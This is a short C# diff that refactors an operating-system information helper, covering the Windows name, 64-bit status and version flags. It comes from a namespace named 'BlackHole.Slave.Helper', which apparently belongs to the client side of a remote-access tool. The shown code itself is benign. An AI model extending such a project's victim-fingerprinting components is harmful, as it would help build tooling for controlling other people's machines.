@@ -27,21 +27,22 @@ namespace BlackHole.Slave.Helper
                 }
             }
 
-            Name = Regex.Replace(Name, "^.*(?=Windows)", "").TrimEnd().TrimStart(); // Remove everything before first match "Windows" and trim end & start
+            // Remove everything before first match "Windows" and trim end & start
+            Name = Regex.Replace(Name, "^.*(?=Windows)", "").TrimEnd().TrimStart(); 
             Is64Bit = Environment.Is64BitOperatingSystem;
-            FullName = string.Format("{0} {1} Bit", Name, Is64Bit ? 64 : 32);
+            FullName = $"{Name} {(Is64Bit ? 64 : 32)} Bit";
         }
         
-        public static string FullName { get; private set; }
-        public static string Name { get; private set; }
-        public static bool Is64Bit { get; private set; }
-        public static bool RunningOnMono { get; private set; }
-        public static bool Win32NT { get; private set; }
-        public static bool XpOrHigher { get; private set; }
-        public static bool VistaOrHigher { get; private set; }
-        public static bool SevenOrHigher { get; private set; }
-        public static bool EightOrHigher { get; private set; }        
-        public static bool EightPointOneOrHigher { get; private set; }        
-        public static bool TenOrHigher { get; private set; }
+        public static string FullName { get; }
+        public static string Name { get; }
+        public static bool Is64Bit { get; }
+        public static bool RunningOnMono { get; }
+        public static bool Win32NT { get; }
+        public static bool XpOrHigher { get; }
+        public static bool VistaOrHigher { get; }
+        public static bool SevenOrHigher { get; }
+        public static bool EightOrHigher { get; }        
+        public static bool EightPointOneOrHigher { get; }        
+        public static bool TenOrHigher { get; }
     }
 }
